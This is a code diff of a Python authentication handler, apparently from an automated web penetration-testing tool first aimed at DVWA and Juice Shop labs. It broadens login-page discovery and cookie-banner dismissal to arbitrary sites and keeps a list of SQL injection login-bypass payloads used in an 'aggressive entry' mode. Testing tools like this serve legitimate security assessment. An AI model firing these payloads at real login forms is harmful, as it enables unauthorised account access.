@@ -30,7 +30,7 @@ class AuthHandler:
         if not has_form:
             self.logger.info("[Auth] 🕵️ No login form detected, searching for login page...")
             # ลองไปที่ /login.php สำหรับ DVWA หรือ /#/login สำหรับ Juice Shop
-            paths = ["/login.php", "/login", "/#/login"]
+            paths = ["/login", "/signin", "/login.php", "/user/login", "/account/login", "/auth/login", "/users/sign_in", "/#/login", "/#/signin"]
             base_url = page.url.split('#')[0].rstrip('/')
             
             for path in paths:
@@ -44,9 +44,13 @@ class AuthHandler:
             self.logger.info(f"[Auth] 🔑 Testing Job Credentials...")
             if await self._try_standard_login(page, credentials):
                 return True
+            # Creds were provided but failed — do NOT fall through to SQLi bypass.
+            # Aggressive entry is only appropriate when operating without credentials.
+            self.logger.warning("[Auth] ⚠️ Standard login failed with provided credentials. Skipping aggressive entry.")
+            return False
 
-        # 2. ถ้าไม่มีหรือพลาด ให้ใช้ Aggressive Entry (SQLi + Default)
-        self.logger.info(f"[Auth][DEBUG] Use Aggressive_entry username:{credentials.get('username')}, passsword: {credentials.get('password')}")
+        # 2. No credentials provided → try Aggressive Entry (SQLi + Default creds)
+        self.logger.info("[Auth] No credentials provided. Attempting Aggressive Entry (SQLi Bypass + Default Creds)...")
         return await self.aggressive_entry(page)
 
     async def _try_standard_login(self, page: Page, creds: dict) -> bool:
@@ -136,33 +140,31 @@ class AuthHandler:
 
     async def _try_sqli_bypass(self, page: Page) -> bool:
         payloads = [
-            # 1. Classic Bypass (พื้นฐานที่ควรมี)
-            "admin@juice-sh.op'--",
+            # Classic tautology bypass
             "' OR 1=1 --",
             "' OR 1=1 #",
             "' OR 1=1 /*",
             
-            # 2. No-Quote Bypass (สำหรับกรณีที่ Query ไม่ได้หุ้มด้วย Quote)
+            # No-Quote bypass
             "1 OR 1=1",
             "admin' OR '1'='1",
             
-            # 3. Tautology with Different Operators (ใช้เครื่องหมายอื่นแทน OR)
+            # Tautology with different operators
             "' OR 'a'='a",
             "') OR ('a'='a",
             "' || 1=1--",
             
-            # 4. Comment Variations (สำคัญมากสำหรับ DBMS ที่ต่างกัน)
+            # Comment variations
             "admin' #",
-            "admin'-- -", # MySQL/SQLite มักต้องการช่องว่างหลัง --
+            "admin'-- -",
             "admin'/*",
             
-            # 5. Null Byte & Encoding (สำหรับเลี่ยง Filter เบื้องต้น)
+            # Null Byte & Encoding
             "admin'%00",
             "admin' or 1=1 LIMIT 1;#",
             
-            # 6. Username Guessing + Comment (เจาะจงชื่อ admin)
+            # Username comment
             "admin'--",
-            "admin' #",
             "' UNION SELECT NULL, 'admin', 'password'--",
         ]
         
@@ -288,16 +290,39 @@ class AuthHandler:
         return False
     
     async def _dismiss_initial_modals(self, page: Page):
-        """กดปิดปุ่ม Dismiss และปุ่มคุ้มครองข้อมูลส่วนบุคคล"""
-        try:
-            # กดปุ่ม "Dismiss" ของ Welcome Banner
-            dismiss_btn = page.locator('button[aria-label="Close Welcome Banner"]')
-            if await dismiss_btn.is_visible():
-                await dismiss_btn.click()
-                
-            # กดปุ่ม "Me want it!" ของ Cookie Message
-            cookie_btn = page.locator('a[aria-label="dismiss cookie message"]')
-            if await cookie_btn.is_visible():
-                await cookie_btn.click()
-        except:
-            pass
+        """Generic modal/cookie banner dismissal for any website"""
+        # Selectors ordered from most-specific to generic
+        dismiss_selectors = [
+            # Juice Shop specific
+            'button[aria-label="Close Welcome Banner"]',
+            'a[aria-label="dismiss cookie message"]',
+            # Generic cookie/GDPR banners
+            'button:has-text("Accept all")',
+            'button:has-text("Accept All")',
+            'button:has-text("Accept cookies")',
+            'button:has-text("Accept")',
+            'button:has-text("Agree")',
+            'button:has-text("I agree")',
+            'button:has-text("I Accept")',
+            'button:has-text("OK")',
+            'button:has-text("Got it")',
+            'button:has-text("Allow all")',
+            'button:has-text("Allow")',
+            # Generic close/dismiss buttons
+            'button:has-text("Close")',
+            'button:has-text("Dismiss")',
+            'button[aria-label="Close"]',
+            'button[aria-label="close"]',
+            '[class*="cookie"] button',
+            '[id*="cookie"] button',
+            '[class*="consent"] button',
+            '[class*="banner"] button',
+        ]
+        for selector in dismiss_selectors:
+            try:
+                btn = page.locator(selector).first
+                if await btn.is_visible(timeout=500):
+                    await btn.click()
+                    await page.wait_for_timeout(300)
+            except:
+                continue
